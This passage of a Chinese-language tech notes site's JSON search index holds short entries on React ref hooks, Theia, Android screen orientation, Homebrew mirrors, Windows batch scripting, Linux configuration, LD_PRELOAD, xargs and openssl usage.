Ref<any>) => { return <input type=\"text\" name=\"child\" ref={ref} />; }); 注解 React.forwardRef参数必须是function，而这个API通常用来解决HOC（高阶组件）中丢失ref的问题。 useImperativeHandle 见: /docs/前端/框架/react/hooks/useImperativeHandle 参考: useRef、createRef的区别及使用，及useRef妙用 react中ref、createRef、useRef、forwardRef以及useImperativeHandle","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-hooks-Forwardref.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-Forwardref.html"},{"title":"hooks","text":"钩子函数? 主要是为了状态逻辑的复用 最常见的内置两种 useState useEffect 注解 貌似严格来说, 只有函数才算Hooks 函数组件拥有 类组件特有 其他 Hook 的规则 只在最顶层使用Hook: 也就是不要在循环、条件或嵌套函数中调用Hook，这样可以做到各个hook 在每一次渲染中，调用的顺序是一致的. 那为什么要保证 hook 调用顺序? 和React实现hook的原理有关, 每次渲染时，React把所有调用的 hook 用数组来储存. 只在React组件中才能调用:","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-hooks-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-index.html"},{"title":"useImperativeHandle","text":"useImperativeHandle 可以让你在使用 ref 时 自定义暴露给父组件的实例值 。 或者 给不存在ref属性的函数组件, 增加ref属性 . 在大多数情况下，应当避免使用 ref 这样的命令式代码。 useImperativeHandle 应当与 /docs/前端/框架/react/hooks/forwardRef 一起使用 暴露DOM节点时自定义暴露属性 useImperativeHandle 应当与 forwardRef 一起使用, 调用方式: useImperativeHandle(ref, createHandle, [deps]) 接收一个ref 接收一个函数，这个函数返回的对象即是要暴露出的ref 类似useEffect，接收一个依赖数组 例子: const FancyInput=(props, ref) =>{ const inputRef = useRef(); useImperativeHandle(ref, () => ({ focus: () => { inputRef.current.focus(); } })); return <input ref={inputRef} />; } export default forwardRef(FancyInput); 渲染: <FancyInput ref={fancyInputRef} /> 的父组件可以调用: fancyInputRef.current.focus() 给非DOM函数组件增加ref属性 与 暴露DOM节点时自定义暴露属性 例子基本一致 注解 函数组件默认没有ref属性. 仅DOM节点(原生提供的HTML节点)有 不过上面还是用了DOM节点ref, 可能初学时存在混淆, 加个自定义函数组件作为例子: const PSelect00 = (props: any) => { return ( <div>p00</div> ) } // 调用子组件 const PSelect0 = React.forwardRef((props, ref) => { // 定义暴露的 ref React.useImperativeHandle(ref, () => ({ do1: do1 })) const do1 = () => {console.log(1)} return ( <PSelect00>p0</PSelect00> ) }) // 父组件 const PSelect1 = () => { const refP0 = React.useRef() return <PSelect0 ref={refP0}/> } 警告 当 forwardRef 内容没有转发 DOM 节点时, 比如此处的: return ( <PSelect00>p0</PSelect00> ) 必须使用 useImperativeHandle 来接收传入的 ref, 否则 ref 为 null. 比如此处的: // 定义暴露的 ref React.useImperativeHandle(ref, () => ({ do1: do1 })) 显而易见嘛, forward本来就是转发ref的, 你都不转发了, 再不声明useImperativeHandle, 不就是null. 那你可能会问, 如果两个都定义了ref呢? 那就是在暴露DOM组件的基础上, 再控制需要暴露的内容.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-hooks-useImperativeHandle.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-useImperativeHandle.html"},{"title":"技术实现","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-index.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-index.html"},{"title":"Theia","text":"一个IDE框架, 前后端分离的架构 以插件的形式编写代码, 支持依赖注入 后端可选浏览器/Electron 注意使用 rawProcessFactory 创建的进程可能受 ProcessManager的控制, 会在关闭时候自动关闭所有由其创建的子进程 注解 此篇幅所有内容, 基于Theia当前版本: % yarn list --pattern=@theia/core yarn list v1.22.17 └─ @theia/core@1.42.1 ✨ Done in 1.06s. 一些更新 跟随theia的更新, theia-1.43.1 此版本中文翻译有问题, \"File\" 会被翻译为本地看见, 研究代码后 在github提出: https://github.com/eclipse-theia/theia/pull/13028 作者有跟进 插件市场 地址: https://open-vsx.org 一些常用插件: 中文支持: https://open-vsx.org/extension/ms-ceintl/vscode-language-pack-zh-hans","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-index.html","loc":"/yq-doc-source-docs-front-end-frame-theia-index.html"},{"title":"Theia框架相关问题总结","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-index.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-index.html"},{"title":"标准库","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-node-Standard-library-index.html","loc":"/yq-doc-source-docs-front-end-node-Standard-library-index.html"},{"title":"node服务端","text":"node相关 node标准库 node三方库 内置变量 process 私以为就是指当前node进程本身, 可用来做很多事情, 比如查看当前包含所有东西的版本: process.versions","tags":"前端","url":"/yq-doc-source-docs-front-end-node-index.html","loc":"/yq-doc-source-docs-front-end-node-index.html"},{"title":"问题","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-question-index.html","loc":"/yq-doc-source-docs-front-end-question-index.html"},{"title":"一些UI相关的了解","text":"16进制颜色 如: #00FF00FF 以 # 开头, 后续以每两个以为一个部分 第一个, 表示透明度, 这里是 00 (透明度为0) 第二个, 表示红色, 这里是 FF (深红) 第二个, 表示黄色, 这里是 00 (浅黄) 第二个, 表示蓝色, 这里是 FF (深蓝) 想要什么颜色就是调整这些部分的值来调色 为什么用两位 因为在十进制中颜色的数值范围为 0 ~ 255 , 如果只用一位 0 ~ F , 对应的范围为 0 ~ 15","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Android-Some-UI-related-understanding.html","loc":"/yq-doc-source-docs-operating-system-Android-Some-UI-related-understanding.html"},{"title":"一些XML配置属性","text":"screenOrientation Android应用程序中， android:screenOrientation 用于 控制activity启动时方向 ，也就是横竖屏展示。 下面列出常用的属性值： unspecified，默认值，由系统决定，不同手机可能不一致 landscape，强制横屏显示 portrait，强制竖屏显示 behind，与前一个activity方向相同 sensor，根据物理传感器方向转动，用户90度、180度、270度旋转手机方向，activity都更着变化 sensorLandscape，横屏旋转，一般横屏游戏会这样设置 sensorPortrait，竖屏旋转 nosensor，旋转设备时候，界面不会跟着旋转。初始化界面方向由系统控制 user，用户当前设置的方向 fullSensor 显示的方向（4个方向）是由设备的方向传感器来决定的， 除了它允许屏幕有4个显示方向之外，其他与设置为\"sensor\"时情况类似， 不管什么样的设备，通常都会这么做。 例如，某些设备通常不使用纵向倒转或横向反转，但是使用这个设置， 还是会发生这样的反转。这个值在API Level 9中引入 fulluser 如果用户锁定了基于传感器的旋转，其行为与 user 相同， 否则，其行为与 fullSensor 相同，允许所有4种可能的屏幕方 向。API级别 18中的新增配置。 locked 将方向锁定在其当前的任意旋转方向。API级别 18 中的新增配置。 参考: https://blog.csdn.net/lixiaoliang0723/article/details/105220692","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Android-Some-XML-configuration-attributes.html","loc":"/yq-doc-source-docs-operating-system-Android-Some-XML-configuration-attributes.html"},{"title":"安卓相关","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Android-index.html","loc":"/yq-doc-source-docs-operating-system-Android-index.html"},{"title":"Mac专有指令","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-index.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-index.html"},{"title":"Mac环境变量","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-index.html","loc":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-index.html"},{"title":"Mac","text":"brew 包管理器brew (HomeBrew) 查看配置: brew config 输出: $ brew config HOMEBREW_VERSION: 4.1.24 ORIGIN: https://github.com/Homebrew/brew ... 更换镜像(忽略): # 替换 brew.git cd \"$(brew --repo)\" git remote set-url origin https://mirrors.ustc.edu.cn/brew.git # 替换 homebrew-core.git # cd \"$(brew --repo)/Library/Taps/homebrew/homebrew-core\" # git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git # 新版没有这目录 参考: https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ 设置环境变量: export HOMEBREW_API_DOMAIN=\"https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles/api\" export HOMEBREW_BOTTLE_DOMAIN=\"https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\" export HOMEBREW_BREW_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git\" export HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\" export HOMEBREW_PIP_INDEX_URL=\"https://pypi.tuna.tsinghua.edu.cn/simple\" 针对 macOS 系统上的 Homebrew: # 手动设置 export HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\" # 注：自 brew 4.0 起，大部分 Homebrew 用户无需设置 homebrew/core 和 homebrew/cask 镜像，只需设置 HOMEBREW_API_DOMAIN 即可。 # 如果需要使用 Homebrew 的开发命令 (如 `brew cat <formula>`)，则仍然需要设置 homebrew/core 和 homebrew/cask 镜像。 # 请按需执行如下两行命令： brew tap --custom-remote --force-auto-update homebrew/core https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git brew tap --custom-remote --force-auto-update homebrew/cask https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask.git # 除 homebrew/core 和 homebrew/cask 仓库外的 tap 仓库仍然需要设置镜像 brew tap --custom-remote --force-auto-update homebrew/cask-fonts https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-fonts.git brew tap --custom-remote --force-auto-update homebrew/cask-versions https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-versions.git brew tap --custom-remote --force-auto-update homebrew/command-not-found https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-command-not-found.git brew tap --custom-remote --force-auto-update homebrew/services https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-services.git brew update # 或使用下面的几行命令自动设置 export HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\" for tap in core cask{,-fonts,-versions} command-not-found services; do brew tap --custom-remote --force-auto-update \"homebrew/${tap}\" \"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-${tap}.git\" done brew update 也可直接使用上面的链接安装.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-index.html","loc":"/yq-doc-source-docs-operating-system-Mac-index.html"},{"title":"问题","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-question-index.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-index.html"},{"title":"nsis打包","text":"参考文档:: NSIS 打包脚本基础 NSIS（Nullsoft Scriptable Install System）是一个开源的 Windows 系统下安装程序制作程序 大体流程是: 编写 NSIS 脚本(后缀为 nsi 的文件) 编译打包. 默认会打包 NSIS 脚本所在目录的所有文件/目录. 可使用GUI界面或者: /docs/操作系统/windows/windows执行文件打包/nsis/makensis 详情 一些没来得及细看的文: NSIS制作安装包笔记 NSIS使用教程(安装包制作安装文件教程,如何封装打包文件) 中文版 关于NSIS脚本操作静默安装第三方程序+判断电脑位数","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-index.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-index.html"},{"title":"nsis","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-index.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-index.html"},{"title":"windows执行程序打包","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-program-packaging.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-program-packaging.html"},{"title":"Windows","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-index.html","loc":"/yq-doc-source-docs-operating-system-Windows-index.html"},{"title":"windows shell","text":"有一篇总结还可以的: Windows 批处理命令教程（不追求看完，只要求看懂） 变量 与linux使用 $ 不同, windows 使用双 % 引用来表示变量, 如a变量: %a% 批处理有一个变量延迟机制, 可以通过设置 变量延迟拓展(延迟环境变量拓展) 来处理: setlocal enabledelayedexpansion 如: @echo off set a=4 set a=5&echo %a% pause 的结果是 4 而: @echo off setlocal enabledelayedexpansion set a=4 set a=5&echo !a! pause 的结果是 5 注解 开启了变量延迟拓展可以按照正常的编码流畅来编码, 不过注意变量定义为使用 两个 ``!`` 包裹 另外, 在 cmd窗口 中，for之后的形式变量I必须使用单百分号引用，即 %I ; 而在 批处理文件 中，引用形式变量I必须使用双百分号，即 %% echo 打印变量: echo %APPDATA% 或者使用 @echo , 区别是 加了 @ 不会显示这条命了本身 几种echo: echo off 接下来的命令(不包括当前命令),只打印结果,不打印命令. @ECHO OFF 接下来的命令(包括本命令)，只打印执行结果，不打印命令本身 ECHO ON 接下来的命令(不包括本命令)，执行命令前会先把命令打印出来 在批处理文件中，如果命令前加@，表示这条命令不打印出来，只把结果打印出来，即@是关闭命令本身的回显 注释 :: 在批处理中表示注释某一行: :: 这是注释信息 也可以使用 rem, 区别是 rem 支持回显: rem 这是支持回显的注释信息 数值范围 类似于 Python 的 range 吧, 使用: /L (start,step,end) step=<end 也叫开关(此处大小写不敏感), 例: setlocal enabledelayedexpansion for /l %%1 in (1, 1, 10) do( set \"k=%%1\" echo !k! ) 获取命令行参数 约定: 获得第i个参数：%i，0<=i && i <=参数最大数量 条件判断 if条件判断, 变量 l 是否已经赋值: if defined l( echo \"已赋值l\" )else( echo \"未赋值l\" ) 支持 not: if not defined xxx 与 或 非的实现: 与(and): if 1==1 if 2==2 echo Ok :: if 1==1 (if 2==2 echo Ok) 或(or), 这里只谈最便捷的 goto: if \"%1\"==\"\" goto printHelp if \"%2\"==\"\" goto printHelp :printHelp @echo This is a help message, please refere to ... 非(not): if not 1==1 echo OK 循环 for循环, 语法: for 循环条件 do ( 内容 ) 在cmd窗口中: for %I in (command1) do command2 在批处理文件中: for %%I in (command1) do command2 高级使用 , 寻找指定目录下的文件(不寻找其下子目录), 但是排除指定内容: @echo off set home=C:\\Users set exclude_list=\"_ video music image img.png ttt.py\" for /f \"delims=*\" %%i in ('dir /b %home% &#94;| findstr /v /i /x %exclude_list%') do ( echo %home%\\\"%%i\" rem rd /s %home%\\\"%%i\" ) 简单说明, for 中使用 单引号 包裹表示需要执行的指令, 这时管道需要加 &#94; 转义 /docs/操作系统/windows/windows_shell/dir : /b 表示值列出目录/文件 字符串; 可加 /s 递归查找下面所有子目录 /docs/操作系统/windows/windows_shell/findstr : /v 反向匹配; /i 忽略大小写; /x 全词匹配 连接符号 连接符号有: ; & && | || ; 顺序执行多条命令，而不管命令是否执行成功. & 与上等同. bash中某条命令后面跟上 &, 用来将命令至于后台执行，避免其占用命令行 && 顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令 | 管道命令 || 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令 管道 与 linux 下 | 表示管道一般情况下一致, 但是在 for 循环中需要使用 &#94; 进行 转义 , 即 &#94;| 表示管道 有一种说法解释见: 是不是只有for的('')中的特殊字符前必须要用&#94;对其转义 我看过&#94;不是在要输出特殊字符才用&#94; 大概意思是, 在for循环中, 如果不进行转义, 如: for /f \"delims=*\" %%i in ('dir /b %home% | findstr /v /i /x %exclude_list%') 会把前面的所有, 即: for /f \"delims=*\" %%i in ('dir /b %home% 当成一个指令, 但你又没有这个指令, 所以需要转义. 程序返回码 变量errorlevel: %errorlevel% 可以通过其值判断上一个指令是否正常执行(正常为0). 相当于 linux 的 $? 判断是文件/目录 判断是文件/目录: if exist \"%%i\" ( if exist \"%%i\\*\" ( echo \"%%i is a folder\" ) else ( echo \"%%i is a file\" ) ) 查看帮助信息 查看帮助信息: command /? 路径拼接引号问题 引号介绍: bat脚本中单引号(')是无效的，必须使用双引号(\")来定义字符串。 在bat脚本中，双引号和空格都需要进行转义处理 定义变量时, 单引号双引号包裹的字符串是不一样的, 不过在bat脚本内部定义时候, 可以不加任何引号表示一个变量 一般单引号只用于 for 循环的时候处理命令; 双引号的话, 举个例子, 如果bat脚本需要传递包含空格的路径参数, 那么为了避免空格把参数分隔, 比如本来是路径是参数1: set app_path=%1 但是由于存在空格, 比如: C:/user/ho me 你又没有在命令行调用时加引号: xxx.bat C:/user/ho me 那么最终获取的参数就是(不带引号): C:/user/ho 而当使用: xxx.bat \"C:/user/ho me\" 得到的结果又为(带引号): \"C:/user/ho me\" 不带引号可能会引起路径丢失的问题, 带引号可能会引起后面参数拼接时候路径不可用问题 带引号时出现问题, 可以从两个方案处理: 方案1: 后面定义的其他部分的路径也加引号 , 如: rem 接受参数的时候就不要加引号了 set app_path=%1 rem 定义一个带一个引号的路径 set tmp_path=\"_\" set new_path=%app_path%\\%tmp_path% 还是以上面的路径为例, 传入的路径为 \"C:/user/ho me\" , 最后的拼接结果为: \"C:/user/ho me\"/\"_\" 这个时候虽存在引号, 但是各部分都是独立的, 可以被系统识别此路径 至于是不是多层独立的引号也可以识别, 感兴趣的可以自己试试: \"\"C:/user/ho me\"\"/\"\"_\"\" 方案二: 去掉所有的引号 , 这个可能会有其他的问题, 如文件如果包含引号怎么处理? 但是一般人不会这个起名. 去除变量的引号: set var=%var:\"=% 如: set p=\"C:/user/ho me\"/\"_\" echo %p% set p=%p:\"=% echo %p% 输出: \"C:/user/ho me\"/\"_\" C:/user/ho me/_ 对于Windows下路径而言 批处理程序删除自己 一般来说直接删除就行: :: 一些其他代码 del %0 但是有时候指令会更新所在路径, 比如: move . tmp\\ 这时候可以利用管道: del %0 | move . tmp\\ 输出重定向 将错误输出, 标准输出重定向到 1.txt 注意顺序不能错 输出重定向: t.bat >1.txt 2>&1 跨盘移动的坑 使用 /docs/操作系统/windows/windows_shell/move 跨盘移动文件夹时, 会报错 拒绝访问 管理员权限也无法. 目前所知的解决方案只有先复制过去然后删除: xcopy /H /E /Y 原有的文件夹 移动到的文件夹 rd /s /q 原有的文件夹 获取绝对路径文件名 如果路径不是传入的参数, 那么需要使用类似函数的方式: @echo off echo 盘符: %~dp0 echo 当前脚本路径: %~dp0 echo 参数1盘符: %~dp1 echo 参数1当前脚本路径: %~dp1 echo 参数1文件名称: %~n1 set p1=C:\\Users\\tt\\1.txt echo %p1% call :get_base_name %p1% goto :eof :get_base_name set file_path=%~dp1 echo %file_path% rem 获取到文件名称 set file_name=%~n1 echo %file_name% rem 获取到文件后缀 set suffix=%~x1 echo %suffix% goto :eof 获取用户名 code: %username% if与循环 if语句不能包含循环语句, 不过可以使用goto处理: @echo off set var=hello if \"%var%\"==\"hello\" goto loop goto end :loop echo doing something... goto loop_end :loop_end echo done goto end :end 指令","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell.html"},{"title":"Windows Shell","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-index.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-index.html"},{"title":"内置函数","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-index.html"},{"title":"解释器执行顺序","text":"暂且只谈 Linux 下的 bash/dash, 以及Python. sh脚本, 大多会在文件头定义: #!/bin/bash Python脚本有些也会在文件头定义: #/usr/bin/python3 这些解释器的执行顺序为 文件头定义的解释器, 若定义了上面类型的文件头, 即使是使用时指定, 也无效, 如 bash 1.sh , 还是会使用文件头的定义 实际执行时使用的解释器, 比如 bash 1.sh , 当脚本内没有定义这样的文件头时, 使用执行时指定的 bash 虚拟系统环境默认解释器 (直接使用文件执行, 仅限于Python, 文件需有可执行权限), 如 ./1.py 系统环境默认解释器 (直接使用文件执行, 文件需有可执行权限), 如 ./1.sh","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Interpreter-execution-order.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Interpreter-execution-order.html"},{"title":"概念性","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-index.html"},{"title":"配置文件","text":"有些东西时间一长就忘了, 想半天也不一定能想起来, 故还是记录一下吧. /etc/hosts 查看本地域名与地址映射, 内容为 地址与域名的映射, 参见: etc-hosts /etc/resolv.conf 配置本机使用dns服务器, 以nameserver开头, 可多行. 参见: etc-resolv-conf /etc/hostname 设置当前主机名, 可通过 hostnamectl 修改, 重启生效 bash的配置文件 持久保存用户配置 profile类 为交互式登陆用户提供配置 功能：设定环境变量，运行命令或脚本: /etc/profile #全局 /etc/profile.d/*.sh #全局 ~/.bash_profile #个人配置，当前用户有效 bashrc类 非交互式登陆用户提供配置 功能：设定本地变量，定义命令别名: /etc/bashrc #全局 ~/.bashrc #个人","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Configuration-file-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Configuration-file-index.html"},{"title":"LD_PRELOAD","text":"可以用来执行程序运行前首先加载的动态库, 多个使用冒号分割, 与Mac的 /docs/操作系统/Mac/Mac环境变量/DYLD_INSERT_LIBRARIES 基本一致 用例: /docs/安全/逆向工程/实战-Ubuntu16下Hook系统的open LD_PRELOAD指定的动态库如果与其他的动态库有同名函数, 则会覆盖掉后者的调用 可以使用 dlsym 来自己重调用后续的同名函数: dlsym(RTLD_NEXT,\"函数名\"); 注解 dlsym 的头文件是 <dlfcn.h> , 依赖于: libdl.so 如果没有需要先安装: apt install libc6-dev 编译的时候如果找不到: gcc -ldl ...","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-Ld_preload.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-Ld_preload.html"},{"title":"Linux环境变量","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-index.html"},{"title":"xargs","text":"xargs 命令 是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。 它擅长将标准输入数据转换成命令行参数，xargs 能够处理管道或者 stdin 并将其转换成特定命令的命令参数。 xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。 xargs 的默认命令是 echo，空格是默认定界符。 这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。 xargs 是构建单行命令的重要组件之一。 xargs（英文全拼： eXtended ARGuments）是给命令传递参数的一个过滤器，也是组合多个命令的一个工具。 xargs 可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。 xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。 xargs 默认的命令是 echo，这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。 xargs 是一个强有力的命令，它能够捕获一个命令的输出，然后传递给另外一个命令。 之所以能用到这个命令，关键是由于很多命令不支持|管道来传递参数， 而日常工作中有有这个必要，所以就有了 xargs 命令，例如: find /sbin -perm +700 |ls -l # 这个命令是错误的 find /sbin -perm +700 |xargs ls -l # 这样才是正确的 参数选项 -n <num> 指定每行num个输出，默认是无限制 -d <xxx> 以xxx为分隔符 -a <file> 从文件中读入作为stdin -e <flag> 注意有的时候可能会是-E，flag必须是一个以空格分隔的标志，当xargs分析到含有flag这个标志的时候就停止。 -p 当每次执行一个argument的时候询问一次用户(询问时, 必须手动输入y, 才会执行) -t 表示先打印命令，然后再执行。 -i , -I 得看linux支持了，将xargs的每项名称，一般是一行一行赋值给 {}，可以用 {} 代替。 -r no-run-if-empty, 当xargs的输入为空的时候则停止xargs，不用再去执行了。 -s <num> 命令行的最大字符数，指的是 xargs 后面那个命令的最大命令行字符数。 -l 将输入分段，一次执行一行，这样可以避免参数列表过长而导致命令行过长的问题 -L <num> 从标准输入一次读取 num 行送给 command 命令。 -x exit的意思，主要是配合-s使用。 -P 修改最大的进程数，默认是1，为0时候为as many as it can ，这个例子我没有想到，应该平时都用不到的吧 xargs 结合 find 使用 用 rm 删除太多的文件时候，可能得到一个错误信息: /bin/rm Argument list too long. 用 xargs 去避免这个问题: find . -type f -name \"*.log\" -print0 | xargs -0 rm -f xargs -0 将 \\0 作为定界符。 用例, 找apk包并复制到文件夹apks: find ./ -name \"*.apk\" 2>/dev/null | xargs -t -I \"{}\" cp \"{}\" apks 再比如MacOS下查找当前目录的rst文档名: ls *.rst | xargs -L1 | cut -d. -f 1","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-XARGS.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-XARGS.html"},{"title":"Linux指令","text":"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-index.html"},{"title":"openssl","text":"常用指令可见: https://www.gy328.com/ref/docs/openssl.html 若无法访问可见: OpenSSL参考手册 </resources/pdf/OpenSSL 参考手册 & openssl 快速入门 - 菜鸟教程.pdf> 官网: https://www.openssl.org 强大的安全套接字层密码库, 利用它的随机功能来生成可以用作密码的随机字母字符串: openssl rand -base64 10 # nU9LlHO5nsuUvw== # standard 标准 # digest 消化 摘要 # cipher 加密 OpenSSL有两种运行模式：交互模式和批处理模式。 直接输入openssl回车进入交互模式，输入带命令选项的openssl进入批处理模式。 OpenSSL整个软件包大概可以分成三个主要的功能部分：密码算法库、SSL协议库以及应用程序。OpenSSL的目录结构自然也是围绕这三个功能部分进行规划的。 对称加密算法 OpenSSL一共提供了8种对称加密算法，其中7种是分组加密算法，仅有的一种流加密算法是RC4。这7种分组加密算法分别是AES、DES、Blowfish、CAST、IDEA、RC2、RC5，都支持电子密码本模式（ECB）、加密分组链接模式（CBC）、加密反馈模式（CFB）和输出反馈模式（OFB）四种常用的分组密码加密模式。其中，AES使用的加密反馈模式（CFB）和输出反馈模式（OFB）分组长度是128位，其它算法使用的则是64位。事实上，DES算法里面不仅仅是常用的DES算法，还支持三个密钥和两个密钥3DES算法。 非对称加密算法 OpenSSL一共实现了4种非对称加密算法，包括DH算法、RSA算法、DSA算法和椭圆曲线算法（EC）。DH算法一般用户密钥交换。RSA算法既可以用于密钥交换，也可以用于数字签名，当然，如果你能够忍受其缓慢的速度，那么也可以用于数据加密。DSA算法则一般只用于数字签名。 信息摘要算法 OpenSSL实现了5种信息摘要算法，分别是MD2、MD5、MDC2、SHA（SHA1）和RIPEMD。SHA算法事实上包括了SHA和SHA1两种信息摘要算法，此外，OpenSSL还实现了DSS标准中规定的两种信息摘要算法DSS和DSS1。 密钥和证书管理 密钥和证书管理是PKI的一个重要组成部分，OpenSSL为之提供了丰富的功能，支持多种标准。 首先，OpenSSL实现了ASN.1的证书和密钥相关标准，提供了对证书、公钥、私钥、证书请求以及CRL等数据对象的DER、PEM和BASE64的编解码功能。OpenSSL提供了产生各种公开密钥对和对称密钥的方法、函数和应用程序，同时提供了对公钥和私钥的DER编解码功能。并实现了私钥的PKCS#12和PKCS#8的编解码功能。OpenSSL在标准中提供了对私钥的加密保护功能，使得密钥可以安全地进行存储和分发。 在此基础上，OpenSSL实现了对证书的X.509标准编解码、PKCS#12格式的编解码以及PKCS#7的编解码功能。并提供了一种文本数据库，支持证书的管理功能，包括证书密钥产生、请求产生、证书签发、吊销和验证等功能。 事实上，OpenSSL提供的CA应用程序就是一个小型的证书管理中心（CA），实现了证书签发的整个流程和证书管理的大部分机制。 <openssl用法详解> https://www.cnblogs.com/yangxiaolan/p/6256838.html 使用openssl生成密码: ┌──(yanque㉿3675b5ebb8ce)-[~/test] └─$ openssl passwd -1 -salt admin 123456 $1$admin$LClYcRe.ee8dQwgrFc5nz. 其中: passwd 表示生成密码 -1 表示使用md5算法 -salt 表示随机使用一个字符串加盐 admin 用户名明文 123456 用户密码明文 命令说明 req:生成证书签名请求(CSR)。用于申请证书。 x509:X.509证书格式相关操作。如签名CSR生成证书、签名其他证书等。 genrsa:生成RSA私钥和公钥。 举个例子: # 生成2048位RSA私钥 openssl genrsa -out key.pem 2048 # 生成CSR openssl req -out csr.pem -newkey rsa:2048 -nodes -keyout key.pem # 使用CA证书和私钥签名CSR生成证书 openssl x509 -req -in csr.pem -CA ca.crt -CAkey ca.key -out cert.pem 通用选项: -i n 从哪个文件读取输入, 比如 server.key -o ut 指定将结果输出到文件 genrsa 生成RSA私钥和公钥 -d es3 指定使用des3算法 -a es256 使用aes256对密钥文件进行对称加密 rsa -p ubout 当需要根据私钥生成公钥时, 使用此选项 -a es256 使用aes256对密钥文件进行对称加密 req 请求生成证书签名请求文件 -n ew 指定新生成证书签名请求文件 -k ey 指定签名时, 使用的私钥, 如server.key -k eyout 直接一步生成证书或证书请求与密钥时, 使用此选项指定密钥名称 -n odes 指定密钥文件不加密 -p assout 若需要加密, 命令行指定密码, 格式: pass:密码 , 否则可在交互式界面手动输入 -n ewkey 指定算法, 格式: <algorithm>:<bits> , 即 <算法>:<长度> , 若不指定加密方式encryption, 私钥将以明文保存, 所以通常会使用如aes256的对称加密算法进行私钥的加密, 提高安全性. 如: rsa:3048, ec:2048. 其他: -x509 直接使用该CSR生成自签名证书, 而不需要第三方CA签名(-out的结果就是证书) ca 作为ca机构对 证书签名请求文件 进行签名 -c ert 使用的证书 -k eyfile 使用的私钥 x509 X.509证书格式相关操作。如签名CSR生成证书、签名其他证书等。 -C Aform 指定证书格式 -C A ca机构所使用的证书, 